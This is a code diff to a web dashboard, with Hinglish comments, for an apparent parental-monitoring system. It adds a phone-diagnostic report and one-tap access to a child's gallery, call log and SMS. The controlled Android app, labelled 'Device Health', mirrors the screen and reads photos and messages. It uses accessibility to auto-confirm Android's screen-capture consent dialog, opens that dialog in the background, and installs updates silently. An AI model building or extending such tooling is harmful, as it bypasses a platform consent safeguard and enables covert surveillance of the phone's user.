@@ -622,6 +622,13 @@ function handleWs(m) {
         // Allow click kar degi, parent dobara tap karega
         S.gallery.loading = false;
         galleryStatus("Gallery permission bachche ke phone par auto-request ho gayi — 5–10 sec me khud Allow ho jayegi. Phir dobara “📸 Gallery kholo” dabao.", true);
+      } else if (m.ok && d.status === "mirror_diag") {
+        // 🔍 Phone check — bachche ke phone ka poora mirror snapshot aa gaya
+        renderMirrorDiag(d);
+      } else if (!m.ok && d.error === "unknown action" && S.mirrorDiagSentAt && Date.now() - S.mirrorDiagSentAt < 15000) {
+        // PURANA child build — mirror_diag command usme hai hi nahi
+        S.mirrorDiagSentAt = 0;
+        renderMirrorDiag({ old: true });
       } else if (m.ok && d.url) {
         $("media-card").classList.remove("hidden");
         $("media-img").src = S.origin + d.url;
@@ -858,6 +865,35 @@ $("quick-grid").querySelectorAll("[data-cmd]").forEach((b) => {
       sendCmd("camera", { facing: "back" });
     } else {
       sendCmd(c);
+    }
+  };
+});
+
+// ---- Quick actions: Gallery / Call log / SMS JUMP buttons ----
+// Ye features pehle "chhupe hue" the — Gallery Live tab me mirror+audio ke
+// niche, Call log/SMS Report tab me apps list ke niche. Parent ko dikhte hi
+// nahi the. Ab Aaj tab ke Quick actions se ek tap me sahi tab + section
+// scroll + auto-load ho jata hai.
+function jumpTo(tab, secId, load) {
+  const btn = document.querySelector('#nav button[data-tab="' + tab + '"]');
+  if (btn) btn.click();
+  setTimeout(() => {
+    const el = document.getElementById(secId);
+    if (el) el.scrollIntoView({ behavior: "smooth", block: "start" });
+    if (load) load();
+  }, 80);
+}
+document.querySelectorAll("[data-jump]").forEach((b) => {
+  b.onclick = () => {
+    if (!S.cid) { alert("Pehle bachcha select karo"); return; }
+    if (b.dataset.jump === "gallery") {
+      jumpTo("live", "sec-gallery", () => {
+        // Khali grid par pehla page khud load karo — parent ko button
+        // dabaane ki zaroorat hi na rahe
+        if (!S.gallery.items.length && !S.gallery.loading) loadGallery();
+      });
+    } else {
+      jumpTo("report", b.dataset.jump === "calls" ? "sec-calls" : "sec-sms", loadLogs);
     }
   };
 });
@@ -1180,6 +1216,62 @@ function mirrorStatus(text, show) {
   el.classList.toggle("hidden", !show || !text);
 }
 
+// 🔍 PHONE CHECK — bachche ke phone se mirror_diag snapshot maango aur
+// readable Hinglish report banao. "Frames nahi aa rahe" ka asli reason
+// andaza nahi — phone khud batata hai: purana app / screen OFF / consent
+// pending / accessibility OFF waghera.
+$("mirror-diag").onclick = () => {
+  if (!S.cid) { alert("Pehle bachcha select karo"); return; }
+  const out = $("mirror-diag-out");
+  out.classList.remove("hidden");
+  out.innerHTML = "⏳ Bachche ke phone se report maang rahe hain… (5–15 sec)";
+  S.mirrorDiagSentAt = Date.now();
+  sendCmd("mirror_diag", {});
+};
+
+function diagRow(ok, label, val, fix) {
+  return "<li>" + (ok ? "✅" : "❌") + " <b>" + label + ":</b> " + val + (fix ? " — <i>" + fix + "</i>" : "") + "</li>";
+}
+
+function renderMirrorDiag(d) {
+  const out = $("mirror-diag-out");
+  if (!out) return;
+  out.classList.remove("hidden");
+  if (d.old) {
+    out.innerHTML = "<b>🔍 Phone check:</b> bachche ke phone par PURANA app hai — Phone check usme hai hi nahi. " +
+      "<b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud kar lega).";
+    return;
+  }
+  const h = d.health || {};
+  const vc = typeof h.versionCode === "number" ? h.versionCode : null;
+  const sdk = typeof d.androidSdk === "number" ? d.androidSdk : null;
+  const androidName = sdk == null ? "?" : sdk >= 35 ? "15+" : sdk === 34 ? "14" : sdk === 33 ? "13" : sdk + " (purana)";
+  const rows = [];
+  // 1. App version — sabse common root cause
+  rows.push(diagRow(vc !== null && vc >= 7, "App version",
+    vc === null ? "pata nahi (purana build)" : "v" + (h.versionName || "") + " (build " + vc + ")" + (vc >= 7 ? " — latest ✓" : " — PURANA"),
+    vc !== null && vc < 7 ? "Set tab → “📲 Child app abhi update karo”" : ""));
+  rows.push("<li>🤖 <b>Android:</b> " + androidName + (d.device ? " · " + esc(d.device) : "") + "</li>");
+  if (d.consentPending) rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui — 5–10 sec ruko</li>");
+  rows.push(diagRow(d.screenOn === true, "Bachche ki screen", d.screenOn ? "ON ✓" : "OFF — frames isliye nahi aa rahe", d.screenOn ? "" : "Phone screen ON karo, frames khud aane lagenge"));
+  rows.push(diagRow(h.mirrorReady === true, "Screen capture consent", h.mirrorReady ? "granted ✓" : "abhi nahi", h.mirrorReady ? "" : "Mirror shuru dabao — dialog khud khulega aur confirm hoga"));
+  rows.push(diagRow(h.accessibility !== false, "Accessibility", h.accessibility === false ? "OFF" : "ON ✓", h.accessibility === false ? "Settings → Accessibility → Device Health → ON (consent auto-confirm isi se hota hai)" : ""));
+  rows.push(diagRow(h.overlay !== false, "Display over apps", h.overlay === false ? "OFF" : "ON ✓", h.overlay === false ? "Settings → Apps → Device Health → Display over other apps → Allow" : ""));
+  rows.push(diagRow(h.canInstall !== false, "Install unknown apps", h.canInstall === false ? "OFF (auto-update nahi hoga)" : "ON ✓", h.canInstall === false ? "Settings → Apps → Device Health → Install unknown apps → Allow" : ""));
+  if (typeof d.frames === "number") rows.push("<li>🎞 <b>Frames (is session):</b> " + d.frames + (d.lastFrameAgoSec != null ? " · last frame " + d.lastFrameAgoSec + "s pehle" : "") + "</li>");
+  if (d.stallReason) rows.push("<li>💬 <b>Phone ka bataya reason:</b> “" + esc(d.stallReason) + "”</li>");
+  // VERDICT — sabse badi dikkat pehle
+  let verdict;
+  if (vc !== null && vc < 7) verdict = "👉 <b>Sabse badi dikkat: PURANA app (build " + vc + "). Mirror/Gallery/Call-log fixes naye build me hi hain — pehle update karo.</b>";
+  else if (d.screenOn === false) verdict = "👉 <b>Screen OFF hai. Bachche ka phone ON karo — frames 1–2 sec me khud aayenge.</b>";
+  else if (h.accessibility === false) verdict = "👉 <b>Accessibility OFF hai — consent dialog khud confirm nahi ho payega. Wo ON karo, phir Mirror band karke dobara shuru karo.</b>";
+  else if (h.overlay === false) verdict = "👉 <b>Display over apps OFF hai — background me consent khulti hi nahi. Allow karo, phir dobara try karo.</b>";
+  else if (d.consentPending) verdict = "👉 <b>Consent abhi confirm ho raha hai — 10 sec ruko. Phir bhi screen na aaye to Mirror band karke dobara shuru karo.</b>";
+  else if ((d.frames || 0) === 0 && h.mirrorReady !== true) verdict = "👉 <b>Capture session start nahi hua — Mirror band karo, 5 sec ruko, phir dobara “▶ Mirror shuru karo” dabao.</b>";
+  else verdict = "👉 <b>Phone side theek lag raha hai — 5–10 sec me frames aane chahiye. Nahi aaye to Mirror band → dobara shuru karo.</b>";
+  out.innerHTML = "<b>🔍 Phone check report:</b><ul style=\"margin:6px 0 0 16px;padding:0\">" + rows.join("") + "</ul><div style=\"margin-top:8px\">" + verdict + "</div>";
+}
+
 function onMirrorFrame(buf) {
   // Band button dabaane ke baad in-flight last frames image ko refresh na karein
   if (!S.mirrorOn) return;
@@ -1217,9 +1309,9 @@ setInterval(() => {
   if (idle > 12000) {
     const c = activeChild();
     const vc = c && c.health && typeof c.health.versionCode === "number" ? c.health.versionCode : null;
-    if (vc !== null && vc < 6) {
+    if (vc !== null && vc < 7) {
       mirrorStatus(
-        "⚠️ Bachche ke phone par PURANA app hai (v" + vc + ", latest v6) — mirror ke Android 14/15 fixes PURANE build me hain hi nahi. Fix: Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update).",
+        "⚠️ Bachche ke phone par PURANA app hai (v" + vc + ", latest v7) — mirror ke Android 14/15 fixes PURANE build me hain hi nahi. Fix: Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update).",
         true
       );
       return;
@@ -1228,7 +1320,7 @@ setInterval(() => {
     mirrorStatus(
       fresh && S.mirrorChildReason
         ? S.mirrorChildReason
-        : "Frames nahi aa rahe (" + Math.round(idle / 1000) + "s) — bachche ka screen OFF hai ya consent abhi confirm ho raha hai. Bachche ka phone screen ON karo, phir khud aa jayenge.",
+        : "Frames nahi aa rahe (" + Math.round(idle / 1000) + "s) — bachche ka screen OFF hai ya consent abhi confirm ho raha hai. Bachche ka phone screen ON karo, ya “🔍 Phone check” dabao — phone khud batayega dikkat kya hai.",
       true
     );
   } else {
@@ -1454,8 +1546,8 @@ function renderLiveDiag() {
   const h = c.health || {};
   const issues = [];
   // #1 PURANA APK — mirror/mic fixes phone tak pahunche hi nahi
-  if (typeof h.versionCode === "number" && h.versionCode < 6) {
-    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v6) — Android 14/15 mirror+gallery+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
+  if (typeof h.versionCode === "number" && h.versionCode < 7) {
+    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v7) — Android 14/15 mirror+gallery+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
   }
   if (h.accessibility === false) {
     issues.push("<b>Accessibility OFF hai</b> — consent dialog aur updates ka auto-confirm kaam nahi karega. <b>Fix:</b> Settings → Accessibility → Device Health → ON. Android 13+ par pehle App info → ⋮ → “Allow restricted settings” karna pad sakta hai.");
